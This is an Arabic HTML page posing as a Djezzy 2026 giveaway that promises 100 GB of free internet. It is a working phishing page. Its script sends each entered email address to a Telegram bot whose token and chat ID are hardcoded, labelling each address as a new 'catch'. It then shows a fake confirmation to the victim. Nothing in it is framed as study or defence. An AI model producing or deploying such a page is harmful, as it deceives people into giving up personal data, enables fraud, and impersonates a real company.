<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Djezzy - هدايا 2026</title>
    <style>
        body { background-color: #f4f4f4; font-family: 'Arial', sans-serif; margin: 0; padding: 0; text-align: center; }
        .header { background-color: #ed1c24; padding: 20px; color: white; }
        .container { background: white; margin: 30px auto; padding: 30px; border-radius: 15px; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-top: 5px solid #ed1c24; }
        h2 { color: #ed1c24; margin-bottom: 10px; }
        p { color: #555; font-size: 16px; line-height: 1.6; }
        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; text-align: center; }
        button { background-color: #ed1c24; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        button:hover { background-color: #c0151b; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Djezzy_logo.svg/1024px-Djezzy_logo.svg.png" alt="Djezzy Logo" style="height: 45px;">
</div>

<div class="container">
    <h2>مبروك! أنت ضمن الفائزين</h2>
    <p>بمناسبة الربيع، جيزي تهديكم تعبئة إنترنت مجانية تصل إلى <b>100 جيغا</b> صالحة لمدة شهر كامل.</p>
    <p>للمشاركة واستلام هديتك، يرجى إدخال بريدك الإلكتروني:</p>
    
    <input type="email" id="targetEmail" placeholder="example@gmail.com" required>
    <button onclick="sendToTelegram()">تأكيد واستلام الهدية</button>
    
    <div id="msg" style="margin-top: 15px; font-weight: bold;"></div>
</div>

<div class="footer">
    &copy; 2026 Djezzy Algeria - جميع الحقوق محفوظة
</div>

<script>
    const TOKEN = '8736351489:AAELCQrNInpGZp4naiPFaehlEjcEmeFeEQA';
    const CHAT_ID = '8487366702';

    async function sendToTelegram() {
        const email = document.getElementById('targetEmail').value;
        const msgDiv = document.getElementById('msg');

        if (!email || !email.includes('@')) {
            alert("يرجى إدخال بريد إلكتروني صحيح!");
            return;
        }

        msgDiv.style.color = "#ed1c24";
        msgDiv.innerText = "جاري معالجة الطلب...";

        try {
            const text = `🎯 صيد جديد ياخو:\n📧 الإيميل: ${email}\n📱 المصدر: مسابقة جيزي`;
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
            
            await fetch(url);

            setTimeout(() => {
                msgDiv.style.color = "green";
                msgDiv.innerText = "تم تأكيد مشاركتك! ستصلك رسالة التفعيل قريباً.";
                document.getElementById('targetEmail').value = "";
            }, 2000);

        } catch (error) {
            msgDiv.style.color = "red";
            msgDiv.innerText = "حدث خطأ، حاول مجدداً.";
        }
    }
</script>

</body>
</html>
